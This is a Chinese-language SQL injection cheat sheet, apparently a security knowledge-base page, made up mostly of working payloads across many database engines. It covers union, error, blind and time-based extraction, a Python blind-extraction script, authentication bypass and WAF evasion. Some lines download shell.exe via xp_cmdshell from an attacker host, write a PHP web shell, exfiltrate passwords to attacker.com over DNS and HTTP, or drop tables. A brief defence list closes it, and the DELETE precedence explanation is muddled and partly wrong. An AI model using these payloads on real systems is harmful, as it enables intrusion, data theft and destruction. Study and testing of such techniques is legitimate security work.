---
attack_surface: [注入类]
impact: [远程代码执行, 信息泄露, 权限提升, 身份伪造, 完整性破坏]
risk_level: 严重
prerequisites:
  - SQL 语法基础
  - HTTP 协议基础
  - Burp Suite 使用
difficulty: 中级
related_techniques:
  - nosql-injection
  - ldap-injection
  - orm-injection
  - rsql-injection
  - xpath-injection
  - command-injection
  - ssrf-server-side-request-forgery
  - file-inclusion
tools:
  - sqlmap
  - Burp Suite
  - sqlmapapi
  - NoSQLMap (for mixed targets)
---

# SQL Injection — 结构化查询语言注入全矩阵

> 关联文档：[NoSQL Injection](../NoSQL%20Injection/README.md) · [ORM Injection](../ORM%20Injection/README.md) · [RSQL Injection](../RSQL%20Injection/README.md) · [Command Injection](../../Reflected%20Values/Command%20Injection/README.md) · [File Inclusion](../../Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md)

---

# 0x01 原理与分类

## 1.1 根本原理

SQL Injection 的根本原因：**应用将用户输入直接拼接到 SQL 查询字符串中，未做参数化处理**。

```python
# 漏洞代码
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")
# Attacker: 1 OR 1=1 --
# Query:   SELECT * FROM users WHERE id = 1 OR 1=1 --
```

## 1.2 分类体系

| 类型 | 特征 | 回显方式 | 自动化难度 |
|------|------|---------|-----------|
| **Union-Based** | 使用 UNION 追加查询结果 | 直接在页面显示 | 低 (sqlmap 自动) |
| **Error-Based** | 利用数据库错误消息泄露数据 | 错误消息 | 低 |
| **Blind Boolean** | 根据 TRUE/FALSE 条件区分响应 | 页面内容差异 | 中 |
| **Blind Time-Based** | 根据时间延迟判断条件真假 | 响应时间差 | 中-高 |
| **Stacked Queries** | 执行多条独立 SQL 语句 | 取决于 API 设计 | 低 |
| **Out-of-Band** | 通过 DNS/HTTP 外泄数据 | 外带信道 | 中 |

---

# 0x02 入口点检测

## 2.1 注入点扫描

```bash
# 基本的异常字符测试
'       # 单引号 → 可能引发 SQL 语法错误
"       # 双引号
`       # 反引号 (MySQL 标识符), 或以特殊方式处理 (PostgreSQL)
')      # 闭合单引号 + 括号
")      # 闭合双引号 + 括号
'))     # 嵌套括号闭合
') -- - # 闭合 + 注释式截断
\       # 转义字符 → 测试引号闭合差异
```

## 2.2 DBMS 识别

### 注释语法差异

| DBMS | 行注释 | 块注释 |
|------|--------|--------|
| MySQL | `-- ` / `#` | `/* */` / `/*! */` (版本条件) |
| PostgreSQL | `-- ` / `/**/` | `/* */` |
| SQL Server | `-- ` / `/**/` | `/* */` |
| Oracle | `-- ` / `/**/` | `/* */` |
| SQLite | `-- ` / `/**/` | `/* */` |
| MS Access | `' comment` (VBA) | N/A |
| DB2 | `-- ` / `/**/` | `/* */` |

### DBMS 指纹函数

| DBMS | Version 函数 | 其他指纹 |
|------|-------------|---------|
| MySQL | `@@version` / `version()` | `database()` / `user()` / `connection_id()` |
| PostgreSQL | `version()` | `current_database()` / `current_user` / `inet_server_addr()` |
| MSSQL | `@@version` | `db_name()` / `system_user` / `host_name()` |
| Oracle | `SELECT banner FROM v$version` | `SELECT user FROM dual` / `global_name` |
| SQLite | `sqlite_version()` | `typeof()` |

## 2.3 确认注入的存在性

```sql
-- 逻辑操作确认
1 AND 1=1        -- 期望正常返回
1 AND 1=2        -- 期望异常/空 → 证明注入存在

-- 算术运算确认
2-1              -- 结果=1 → 可运算
1' + '1          -- 字符串拼接

-- 时间延迟确认（各 DBMS）
-- MySQL
1 AND SLEEP(5)
-- PostgreSQL
1 AND pg_sleep(5)
-- MSSQL
1; WAITFOR DELAY '0:0:5'--
-- Oracle
AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0
```

---

# 0x03 Union-Based 注入

## 3.1 列数探测

```sql
-- 方法 1: ORDER BY 递增探测
1' ORDER BY 1 --    → 正常
1' ORDER BY 2 --    → 正常
1' ORDER BY 3 --    → 正常
1' ORDER BY 4 --    → 错误 → 共 3 列

-- 方法 2: GROUP BY 递增
1' GROUP BY 1 --    → 正常
1' GROUP BY 2 --    → 正常
1' GROUP BY 3 --    → 正常
1' GROUP BY 4 --    → 错误 → 共 3 列

-- 方法 3: UNION SELECT NULL
1' UNION SELECT NULL --
1' UNION SELECT NULL,NULL --
1' UNION SELECT NULL,NULL,NULL --  → 正常 → 共 3 列
```

## 3.2 UNION 注入提取数据

```sql
-- 基础信息收集 (MySQL)
1' UNION SELECT @@version, database(), user() --

-- 列出所有表
1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --

-- 提取列名
1' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users' --

-- 提取敏感数据
1' UNION SELECT id, username, password FROM users --

-- 字符串拼接
1' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables --
-- PostgreSQL: string_agg(table_name, ',')
-- MSSQL: STRING_AGG(table_name, ',')
-- Oracle: LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name)
```

## 3.3 Hidden Union (LIMIT 绕过)

```sql
-- 当原始查询使用 LIMIT 时，可能只返回第一条记录
-- 攻击: 使用空子查询或非法值使第一条记录不存在

1' AND 0 UNION SELECT 1,username,password FROM users --

-- 或使用 LIMIT OFFSET
1' UNION SELECT 1,2,3 FROM (SELECT * FROM users LIMIT 1 OFFSET 0) a --
```

---

# 0x04 Error-Based 注入

## 4.1 MySQL Error-Based

```sql
-- ExtractValue (最常用)
1' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) --

-- UpdateXML
1' AND updatexml(1, concat(0x7e, (SELECT database())), 1) --

-- FLOOR / RAND 双查询 (单行提取)
1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --

-- GTID 双查询
1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), 0x7e, @@gtid_mode) x FROM information_schema.tables GROUP BY x) a) --
```

## 4.2 PostgreSQL Error-Based

```sql
-- CAST 类型转换错误泄露数据
' AND CAST((SELECT usename FROM pg_user LIMIT 1) AS INT) --

-- 字符串截断错误
' AND (SELECT CASE WHEN 1=1 THEN CAST(1/0 AS TEXT) ELSE 'safe' END) --
```

## 4.3 MSSQL Error-Based

```sql
-- CONVERT / CAST
1' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.tables)) --

-- 使用 ISNULL 串联多列
1' AND 1=CONVERT(INT, (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),'') + ISNULL(CAST(id AS NVARCHAR(4000)),'') FROM sys.tables)) --
```

---

# 0x05 Blind SQL Injection

## 5.1 Boolean-Based Blind

通过 TRUE/FALSE 条件下响应差异逐字符提取：

```python
import requests, string

def blind_extract(url, query):
    """Boolean-based blind extraction"""
    result = ""
    for pos in range(1, 50):
        for ch in string.printable:
            # MySQL / PostgreSQL
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={ord(ch)} --"
            r = requests.get(url, params={"id": payload})
            if "TRUE_INDICATOR" in r.text:  # 如 "Welcome" / 特定长度
                result += ch
                print(f"[+] Position {pos}: {ch} → {result}")
                break
        else:
            break  # 无匹配 → 已到字符串尾
    return result
```

## 5.2 Time-Based Blind

当布尔盲注不可区分时，使用时间延迟判断：

```sql
-- MySQL: 条件为真时延迟
' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) --

-- PostgreSQL
' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- MSSQL
'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5' --
```

## 5.3 Error-Blind 混合 (Error + Blind)

错误消息本身可作为 boolean oracle：

```sql
-- 条件为真 → 正常；条件为假 → 除零错误
' AND CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1 ELSE 1/0 END --
```

---

# 0x06 Stacked Queries

当数据库驱动支持多语句执行时（如 PHP MySQLi 的 `multi_query`）：

```sql
-- 基础 stacked
1; SELECT * FROM users --

-- 数据修改
1; UPDATE users SET password='hacked' WHERE username='admin' --

-- DROP 语句
1; DROP TABLE users --

-- MSSQL xp_cmdshell RCE
1; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker/shell.exe C:\Windows\Temp\shell.exe' --

-- PostgreSQL 文件写入 RCE
1; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php' --
```

---

# 0x07 Out-of-Band (OOB) 注入

## 7.1 DNS 外带

```sql
-- MySQL (Windows 且 secure_file_priv 为空)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))

-- MSSQL
EXEC master.dbo.xp_dirtree CONCAT('\\\\', (SELECT TOP 1 password FROM users), '.attacker.com\\a')

-- Oracle
SELECT DBMS_LDAP.INIT((SELECT password FROM users WHERE ROWNUM=1) || '.attacker.com', 80) FROM DUAL
```

## 7.2 HTTP OOB

```sql
-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(whoami)'

-- Oracle
-- UTL_HTTP 外带
UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT password FROM users WHERE ROWNUM=1))

-- MSSQL OLE 自动化
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @O INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @O OUT; EXEC sp_OAMethod @O, 'open', NULL, 'GET', CONCAT('http://attacker/', (SELECT TOP 1 password FROM users));
```

---

# 0x08 认证绕过 Payload

## 8.1 经典 Payload

```sql
-- 基础永真条件
' OR 1=1 --
' OR '1'='1
admin' --
admin' #
' OR '' = '
' || 1=1 #

-- 含括号闭合
') OR ('1'='1
') OR 1=1 --

-- UNION 绕过
' UNION SELECT 1, 'admin', 'anypass' --

-- LIMIT 绕过
' OR 1=1 LIMIT 1 --
```

## 8.2 MD5 Raw Hash 绕过

某些应用将原始密码 MD5 哈希的二进制结果直接拼接到查询中。构造一个原始哈希包含 `'='` 的字符串：

```sql
-- 字符串: 1295819262116515719124661865126651 → raw MD5 = '='OR'
-- 当密码=该字符串，查询变为:
SELECT * FROM users WHERE user = 'admin' AND password = ''=''OR''

-- 另一个著名字符串: ffifdyop → raw MD5 包含 ' OR '(1)
```

## 8.3 GBK/宽字节绕过

当字符集为 GBK 且应用调用了 `addslashes()`：

```sql
-- 原始输入: 1'
-- addslashes 后: 1\'
-- 宽字节攻击: 1%df%27
-- --> 1運'  (0xdf5c 被 GBK 解码为 "運")
-- 单引号未被转义 → 注入成功
```

---

# 0x09 INSERT/UPDATE/DELETE 注入

## 9.1 INSERT 语句注入

```sql
-- 原始: INSERT INTO users (name, email) VALUES ('input', 'fixed')
-- Payload (name 字段):
x', (SELECT password FROM users LIMIT 1)) --

-- 结果: INSERT INTO users (name, email) VALUES ('x', (SELECT password FROM users LIMIT 1)) --', 'fixed')

-- 利用 INSERT 写入 WebShell (MySQL)
x', 0x3C3F7068702073797374656D28245F4745545B2763275D293B203F3E) --
-- 条件: 需要文件写入权限
```

## 9.2 截断攻击 (Truncation Attack)

```sql
-- MySQL 默认不启用 STRICT 模式时，超长字符串静默截断
-- 原始: INSERT INTO users (username, password) VALUES ('admin   [padding]', 'attacker')
-- 如果 username 字段 varchar(20)，且超出部分被截断:
-- → 可能创建第二个 'admin' 用户

-- 利用: 
-- 1. 注册用户名: 'admin               x' (20+ 字符)
-- 2. MySQL 截断为 'admin' (20 字符)
-- 3. 密码设为攻击者已知值
-- 4. 已存在 admin → 新的 INSERT 覆盖/冲突？
-- 5. 可能通过 ON DUPLICATE KEY UPDATE 绕过
```

## 9.3 DELETE 注入

```sql
-- 原始: DELETE FROM messages WHERE id = INPUT AND user_id = session_id
-- 注入:
1 OR 1=1
-- 结果: DELETE FROM messages WHERE id = 1 OR 1=1 AND user_id = 12345
-- → 由于 AND 优先级高于 OR: id=1 OR (1=1 AND user_id=12345) → 只删 user_id=12345 的消息
-- 但若注入: 1 OR 1=1; --
-- → 删除所有消息
```

---

# 0x0A WAF 绕过技术

## 10.1 空格绕过

```sql
-- 禁止空格时使用替代字符
SELECT/*comment*/password/**/FROM/**/users  -- 内联注释替代空格
SELECT%09password%0AFROM%0Ausers            -- 制表符/换行
SELECT+password+FROM+users                   -- URL 编码后的 + 在某些 DBMS 中被忽略

-- 括号链绕过 (适用于 Oracle/PostgreSQL)
SELECT(password)FROM(users)

-- 反引号/方括号
SELECT`password`FROM`users`  -- MySQL
SELECT[password]FROM[users]  -- MSSQL
```

## 10.2 逗号绕过

```sql
-- SUBSTRING 无逗号版本
-- FROM n FOR 1 替代 SUBSTRING(str, n, 1)
SELECT SUBSTRING(password FROM 1 FOR 1) FROM users

-- LIMIT 无逗号版本
-- LIMIT 1 OFFSET 0 替代 LIMIT 0,1
SELECT password FROM users LIMIT 1 OFFSET 0

-- UNION 无逗号 (使用 JOIN)
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

## 10.3 关键字绕过

```sql
-- 大小写混淆
SeLeCt vErSiOn()

-- 双写绕过
SELSELECTECT

-- 内联注释绕过
SEL/**/ECT

-- 十六进制编码
SELECT 0x70617373776F7264  -- 表示 'password'

-- 科学记数法 (绕过等于号)
' OR 1.e(1)=1 --    -- MySQL
```

## 10.4 编码绕过

```sql
-- URL 编码
' UNION SELECT 1,2,3 --  →  %27%20UNION%20SELECT%201,2,3%20--

-- 双重 URL 编码（绕过仅解码一次的 WAF）
%2527  → 第一次解码 = %27 → 第二次解码 = '

-- Unicode / UTF-16 BE
' OR 1=1 --  →  %u0027%u0020OR%u00201=1%u0020--

-- Base64 编码 (某些 API 接受 Base64 输入)
J10gVU5JT04gU0VMRUNUIDEsMiwzIC0t  →  ' UNION SELECT 1,2,3 --
```

## 10.5 Column Name 限制绕过

当 WAF 屏蔽 `password` 关键字，或应用限制可提取的列名时：

```sql
-- 使用别名
SELECT pass AS p FROM users

-- 使用列序号
SELECT * FROM users → 提取第 N 列 (盲注)

-- MySQL 使用 hex/decimal 表示列名
-- 从 information_schema 查表再查列序号

-- PostgreSQL JSON 转换
SELECT row_to_json(users) FROM users
```

## 10.6 ORDER BY 注入

```sql
-- 原始: SELECT * FROM products ORDER BY sort_field
-- 注入 sort_field 参数:
sort_field = 1
sort_field = (SELECT CASE WHEN 1=1 THEN name ELSE price END)
sort_field = (SELECT password FROM users LIMIT 1)

-- Blind ORDER BY + LIMIT 注入
sort_field = CASE WHEN (SUBSTRING(password,1,1)='a') THEN name ELSE price END
```

---

# 0x0B 高级利用

## 11.1 Routed SQL Injection

当应用对 SQL 注入的返回进行二次加固：把注入的结果作为另一个 SQL 查询的输入（二级注入）。

```
[用户输入] → [INSERT 表 A (转义)] → [后台任务读取表 A → 拼接到 SELECT 表 B]
                                     ↑ 这里用户输入已被"解毒"过，但拼接时无参数化
```

## 11.2 Subquery in SELECT List

当 WHERE 子句无法注入但 SELECT 列表可控制时：

```sql
-- 可控制 SELECT 的字段列表
username, (SELECT password FROM users LIMIT 1) AS pw
-- → 在应用展示 "pw" 字段的位置泄露密码

-- JSON_VALUE / JSON AST 转换 (某些 ORM 引擎)
-- 如果应用使用 JSON_VALUE 等函数转换查询结果 → 可能在转换函数内注入
```

## 11.3 SQL Injection → RCE

```
MySQL:
  [INTO OUTFILE] → WebShell
  [UDF] → 加载编译后的共享库 → 执行系统命令

PostgreSQL:
  [COPY .. TO PROGRAM] → 直接执行系统命令
  [lo_import] → 大对象读取任意文件

MSSQL:
  [xp_cmdshell] → 直接执行系统命令
  [sp_OACreate] → OLE 自动化对象 → 执行任意程序

Oracle:
  [DBMS_SCHEDULER] → 创建调度作业 → 执行系统命令
  [Java Stored Procedure] → 加载 Java 类 → RCE
```

---

# 0x0C 防御策略

1. **参数化查询 / Prepared Statements** — 第一优先级，对所有 DBMS 有效
2. **存储过程** — 避免动态 SQL 字符串拼接
3. **输入验证** — 白名单过滤（如 `id` 只允许正整数）
4. **最小权限** — 应用连接数据库使用最低权限账户（如只读，CRUD 白名单表）
5. **WAF** — 作为纵深防御的额外一层（不依赖 WAF 作为唯一防线）
6. **错误消息外化** — 生产环境不暴露数据库错误给用户
7. **ORM 框架** — 虽然不能完全防止（见 ORM Injection），但比原生字符串拼接安全

---

# 0x0D 参考资料

- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [sqlmap — Automatic SQL Injection Tool](https://sqlmap.org/)
- [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [MySQL — String Functions](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html)
- [PostgreSQL — SQL Syntax](https://www.postgresql.org/docs/current/sql.html)
